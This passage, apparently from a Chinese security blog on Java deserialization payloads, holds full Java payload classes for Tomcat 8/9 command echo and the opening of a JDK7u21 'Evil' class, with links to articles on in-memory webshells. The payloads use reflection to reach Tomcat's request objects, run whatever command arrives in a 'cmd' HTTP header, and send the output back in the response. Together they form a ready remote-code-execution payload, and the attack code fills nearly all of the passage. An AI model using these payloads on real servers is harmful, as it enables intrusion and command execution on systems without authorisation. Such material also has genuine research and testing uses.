                    <span class="token class-name">Object</span> obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"this$0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"global"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"processors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token class-name">ArrayList</span> processors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span>

                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>m<span class="token operator">&lt;</span>processors<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                        <span class="token class-name">Object</span> o <span class="token operator">=</span> processors<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span>o <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"RequestInfo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                            field <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"req"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>

                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>obj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"null"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token class-name">Request</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span>
                                <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                    byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token class-name">ByteChunk</span> bc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteChunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                bc<span class="token punctuation">.</span><span class="token function">setBytes</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                request<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doWrite</span><span class="token punctuation">(</span>bc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="Tomcat8-9回显"><a href="#Tomcat8-9回显" class="headerlink" title="Tomcat8/9回显"></a>Tomcat8/9回显</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span></span><span class="token class-name">ByteBuffer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span></span><span class="token class-name">Request</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> tomcat89Shiro <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token function">tomcat89Shiro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">ThreadGroup</span> group <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getThreadGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Field</span> field <span class="token operator">=</span> group<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"threads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token punctuation">]</span> threads <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Thread</span> thread<span class="token operator">:</span>threads<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token class-name">String</span> name <span class="token operator">=</span> thread<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Poller"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    field <span class="token operator">=</span> thread<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"target"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Object</span> obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"this$0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>


                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"global"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"processors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token class-name">ArrayList</span> processors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span>

                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>m<span class="token operator">&lt;</span>processors<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                        <span class="token class-name">Object</span> o <span class="token operator">=</span> processors<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span>o <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"RequestInfo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                            field <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"req"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            obj <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>

                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>obj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"null"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token class-name">Request</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span>
                                <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                    byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                                request<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doWrite</span><span class="token punctuation">(</span><span class="token class-name">ByteBuffer</span><span class="token punctuation">.</span><span class="token function">wrap</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload/image-20210914011206361.png" alt loading="lazy"></p>
<p>回显这里可以参考以下文章思路</p>
<ul>
<li><p><a href="https://xz.aliyun.com/t/7307">linux下java反序列化通杀回显方法的低配版实现</a></p>
</li>
<li><p><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/7535">tomcat不出网回显连续剧第六集</a></p>
</li>
<li><p><a href="http://xiashang.xyz/2020/12/27/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E5%9B%9B%EF%BC%88%E5%AE%9E%E6%88%98%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记四（实战篇）</a></p>
</li>
<li><p><a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">半自动化挖掘request实现多种中间件回显</a>  目前使用的主要方法</p>
</li>
</ul>
<h3 id="JDK7u21原生链"><a href="#JDK7u21原生链" class="headerlink" title="JDK7u21原生链"></a>JDK7u21原生链</h3><p>Evil.java</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rce</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

